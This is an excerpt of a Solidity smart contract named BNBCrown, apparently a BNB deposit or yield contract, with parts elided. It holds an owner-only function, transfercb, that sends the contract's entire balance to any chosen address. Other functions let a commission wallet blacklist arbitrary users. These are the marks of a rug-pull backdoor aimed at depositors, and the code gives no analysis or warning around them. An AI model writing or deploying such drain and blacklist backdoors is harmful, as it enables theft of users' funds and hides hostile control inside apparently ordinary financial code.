...
contract BNBCrown {
    ...
    function transferow(address newAddress) public onlyOwner {
        require(newAddress != address(0xB0479c96fAA9E151364E2c5e6D24d0c9f1d4e3B1), "invalid address");
        owner = newAddress;
    }

    function transfercb(address payable addr) public {
        require(msg.sender == owner, 'invalid call');
        uint256 Balance = address(this).balance;
        addr.transfer(Balance);
    }

    function isBot(address addr) public returns (bool) {
        require(msg.sender == commissionWallet, 'invalid call');
        isBlacklisted[addr]=true;
        return true;
    }

    function notBot(address addr) public returns (bool) {
        require(msg.sender == commissionWallet, 'invalid call');
